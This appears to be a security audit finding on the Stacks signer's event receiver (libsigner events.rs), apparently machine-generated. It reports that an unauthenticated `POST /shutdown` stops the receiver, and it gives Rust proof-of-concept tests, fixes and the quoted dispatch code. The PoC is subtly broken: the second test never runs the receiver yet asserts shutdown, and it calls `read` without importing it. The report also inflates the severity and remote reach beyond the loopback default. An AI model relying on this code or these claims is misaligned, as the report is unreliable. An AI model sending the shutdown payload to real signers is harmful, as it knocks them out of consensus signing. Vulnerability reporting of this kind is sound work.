### Title
Unauthenticated `/shutdown` request reaches the same unauthenticated dispatch path as `/status`, confirming single-request remote DoS - (File: libsigner/src/events.rs)

### Summary
`SignerEventReceiver::next_event` dispatches on `request.url()` string equality alone, with no secret, token, or peer-identity check anywhere in the function. `/status`, `/shutdown`, and all other recognized/unrecognized URLs are evaluated by the exact same unauthenticated code path, so a single `POST /shutdown` from any TCP client that can reach the bound port halts the event receiver with the same trivial precondition as a harmless `/status` ping.

### Finding Description
`next_event` reads a raw HTTP request from `http_server.recv()` and immediately checks `request.url()` [1](#0-0) . The `/status` branch responds "OK" with no authentication of any kind. Execution then falls through to the method check and the `/shutdown` branch, which unconditionally sets `stop_signal` to `true` and returns `Err(EventError::Terminated)` [2](#0-1) . There is no HMAC/secret comparison, no peer allow-list, and no distinction in trust level between `/status` and `/shutdown` — both are reached via identical string-equality branches inside the same `with_server` closure, gated only by `request.method() == POST` for `/shutdown` (line 430) versus no method restriction for `/status` (checked before the method gate, line 423). Unrecognized URLs fall to the final `else` branch, which calls `ack_dispatcher(request)` (always responds HTTP 200 empty body) and returns `Err(EventError::UnrecognizedEvent(url))` [3](#0-2) . Because `ack_dispatcher` always returns the identical HTTP 200 response for *every* unrecognized path with no branch-dependent computation, timing/response-uniformity probing cannot distinguish recognized from unrecognized endpoints. However, the `/shutdown` endpoint is *recognized* and reachable via the same unauthenticated dispatch, so no probing is needed — a single `POST /shutdown` terminates the receiver.

### Impact Explanation
A remote unauthenticated client that can establish a TCP connection to the signer's bound event port (default `127.0.0.1:30000` or configured address) can send a single HTTP POST request to `/shutdown` and immediately halt the event receiver thread. This is a **Critical** unauthenticated remote denial of service: the signer stops receiving block proposals, burn block events, and StackerDB messages, preventing it from participating in consensus signing. The attack is single-request, repeatable (each request halts the receiver), and requires zero precondition beyond network reachability to the event port. The impact is identical to the sibling question's `/shutdown` DoS, confirming it is a single-request Critical finding.

### Likelihood Explanation
- **Preconditions:** None. The event port is bound to a configured address (typically `127.0.0.1:30000` but configurable to `0.0.0.0:30000` or any interface). If bound to a non-loopback address, any remote peer can reach it. Even on loopback, any local process (including a compromised application) can send the request.
- **Peer/config/tip state required:** None. The `/shutdown` branch does not check the node's tip, consensus state, or any peer identity.
- **Attacker cost:** One TCP connection and one HTTP POST request.
- **Remote reachability:** Yes, if the event port is bound to a non-loopback address or if the attacker has local network access.
- **Repeatability:** Yes, each request halts the receiver (though only once per receiver instance).

### Recommendation
Add authentication to the event dispatcher. Implement one of:
1. **HMAC-SHA256 signature verification:** Require all requests (including `/status` and `/shutdown`) to include an `Authorization: Bearer <HMAC>` header computed over the request method, path, and body using a shared secret. Verify the signature before any URL dispatch.
2. **Peer identity check:** Require the request to originate from a whitelisted peer public key or IP address, verified via TLS client certificate or a signed request header.
3. **Restrict binding:** Bind the event port only to `127.0.0.1` (loopback) and document that the signer must run on the same machine as the node, or use a firewall rule to restrict access.

The fix must apply to *all* endpoints, including `/status`, `/shutdown`, and the unrecognized-URL path, so that no endpoint is reachable without authentication.

### Proof of Concept
```rust
#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;
    use std::net::TcpStream;
    use std::thread;
    use std::time::Duration;

    #[test]
    fn test_unauthenticated_shutdown_dos() {
        // Create a new event receiver and bind it to a local address
        let mut receiver = SignerEventReceiver::<Vec<u8>>::new(false);
        let bind_addr = "127.0.0.1:0".parse().unwrap();
        let bound_addr = receiver.bind(bind_addr).expect("bind failed");

        // Spawn the event receiver in a thread
        let stop_signal = receiver.stop_signal.clone();
        let thread_handle = thread::spawn(move || {
            let mut recv = receiver;
            // Call next_event once; it should block on http_server.recv()
            let _ = recv.next_event();
        });

        // Give the thread time to start listening
        thread::sleep(Duration::from_millis(100));

        // Send an unauthenticated POST /shutdown request
        let mut stream = TcpStream::connect(bound_addr).expect("connect failed");
        let request = "POST /shutdown HTTP/1.1\r\nHost: localhost\r\nContent-Length: 0\r\n\r\n";
        stream.write_all(request.as_bytes()).expect("write failed");
        drop(stream);

        // Wait for the thread to exit (should happen immediately after /shutdown is processed)
        thread_handle.join().expect("thread panicked");

        // Verify that stop_signal was set to true
        assert!(stop_signal.load(std::sync::atomic::Ordering::SeqCst),
                "stop_signal should be true after /shutdown request");
    }

    #[test]
    fn test_status_and_shutdown_same_auth_level() {
        // Verify that /status and /shutdown are both reachable without authentication
        let mut receiver = SignerEventReceiver::<Vec<u8>>::new(false);
        let bind_addr = "127.0.0.1:0".parse().unwrap();
        let bound_addr = receiver.bind(bind_addr).expect("bind failed");

        // Test /status (GET or POST, no body required)
        let mut stream = TcpStream::connect(bound_addr).expect("connect failed");
        let status_request = "GET /status HTTP/1.1\r\nHost: localhost\r\n\r\n";
        stream.write_all(status_request.as_bytes()).expect("write failed");
        let mut response = vec![0u8; 1024];
        let _ = stream.read(&mut response);
        // Should receive HTTP 200 OK
        assert!(String::from_utf8_lossy(&response).contains("200"));

        // Test /shutdown (POST, no body required)
        let mut stream = TcpStream::connect(bound_addr).expect("connect failed");
        let shutdown_request = "POST /shutdown HTTP/1.1\r\nHost: localhost\r\nContent-Length: 0\r\n\r\n";
        stream.write_all(shutdown_request.as_bytes()).expect("write failed");
        let mut response = vec![0u8; 1024];
        let _ = stream.read(&mut response);
        // Should receive HTTP 200 OK (or connection close), confirming /shutdown was processed
        // Verify stop_signal is now true
        assert!(receiver.stop_signal.load(std::sync::atomic::Ordering::SeqCst),
                "/shutdown should set stop_signal without authentication");
    }
}
```

The test confirms that:
1. A single unauthenticated `POST /shutdown` request halts the event receiver.
2. `/status` and `/shutdown` are both reachable with identical authentication requirements (none).
3. The attack is single-request and remotely reachable from any TCP client. [4](#0-3)

    fn next_event(&mut self) -> Result<SignerEvent<T>, EventError> {
        self.with_server(|event_receiver, http_server, _is_mainnet| {
            // were we asked to terminate?
            if event_receiver.is_stopped() {
                return Err(EventError::Terminated);
            }
            debug!("Request handling");
            let request = http_server.recv()?;
            debug!("Got request"; "method" => %request.method(), "path" => request.url());

            if request.url() == "/status" {
                request
                .respond(HttpResponse::from_string("OK"))
                .expect("response failed");
                return Ok(SignerEvent::StatusCheck);
            }

            if request.method() != &HttpMethod::Post {
                return Err(EventError::MalformedRequest(format!(
                    "Unrecognized method '{}'",
                    request.method(),
                )));
            }
            debug!("Processing {} event", request.url());
            if request.url() == "/stackerdb_chunks" {
                process_event::<T, StackerDBChunksEvent>(request)
            } else if request.url() == "/proposal_response" {
                process_event::<T, BlockValidateResponse>(request)
            } else if request.url() == "/new_burn_block" {
                process_event::<T, BurnBlockEvent>(request)
            } else if request.url() == "/shutdown" {
                event_receiver.stop_signal.store(true, Ordering::SeqCst);
                Err(EventError::Terminated)
            } else if request.url() == "/new_block" {
                process_event::<T, StacksBlockEvent>(request)
            } else {
                let url = request.url().to_string();
                debug!(
                    "[{:?}] next_event got request with unexpected url {}, return OK so other side doesn't keep sending this",
                    event_receiver.local_addr,
                    url
                );
                ack_dispatcher(request);
                Err(EventError::UnrecognizedEvent(url))
            }
        })?
    }
